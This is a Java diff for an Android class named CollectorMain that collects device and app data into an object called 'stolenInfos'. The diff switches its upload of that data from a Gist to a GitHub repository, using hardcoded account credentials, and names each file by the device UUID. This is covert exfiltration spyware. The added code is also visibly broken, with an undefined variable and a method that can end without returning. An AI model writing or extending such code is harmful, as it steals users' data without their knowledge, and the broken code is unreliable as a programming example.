@@ -32,7 +32,8 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
-			Gist gst=null;
+			Repository repo=null;
+			List<RepositoryContents> cont=null;
 			String s="";
 			try {
 				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
@@ -45,7 +46,9 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			String[] files=Constant.EMPTY_STRING_ARRAY;
 			try {
 				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
-				gst = new GistService(ghc).getGist("544acb279290b659766e");
+				//gst = new GistService(ghc).getGist("544acb279290b659766e");
+			    repo=new RepositoryService(ghc).getRepository("RevealEverything", "Files");
+			    cont=new ContentsService(ghc).getContents(repo);
 			} catch (Throwable e) {
 				e.printStackTrace(System.out);
 			}
@@ -54,9 +57,24 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				for (String filename:files) {
 					Log.d("gist", "upload:" + filename);
 					try {
-						GistFile gf=new GistFile().setContent(sb.getString(filename, "")).setFilename(TheApplication.instance.uuid + "_" + filename);
-						datas.put(TheApplication.instance.uuid + "_" + filename, gf);
-					} catch (Throwable e) {
+						Map<String, String> params = new HashMap<>();
+				        params.put("path", filename);
+						params.put("message", "upload");
+						byte[] file = Files.readAllBytes(jsonFile.toPath());
+						try {
+							params.put("sha", getHash(cont, filename));
+							if (getHash(cont, generateFilename(jsonFile)).equalsIgnoreCase(shash(file))) {
+						continue;
+							}
+						} catch (Exception e) {
+							// TODO 自動生成された catch ブロック
+							e.printStackTrace();
+						}
+						params.put("content", Base64.encodeBase64String(file));
+						ghc.put("/repos/RevealEverything/Files/contents/" + generateFilename(jsonFile), params,
+								new TypeToken<ContentUpload>() {
+								}.getType());
+				    } catch (Throwable e) {
 						e.printStackTrace(System.out);
 						continue;
 					}
@@ -90,6 +108,14 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 				Log.d("remain", s);
 			}
 		}
+	}
+	public static String getHash(List<RepositoryContents> cont, String filename) {
+	    for(RepositoryContents o:cont){
+	        if(o.getName().equals(filename)){
+	            return o.getSha();
+	        }
+	    }
+		//return cont.stream().filter(o -> o.getName().equals(filename)).distinct().findFirst().get().getSha();
 	}
 	public static class Infos {
 		public HashMap<String,String> mcpeSettings=readSettings();
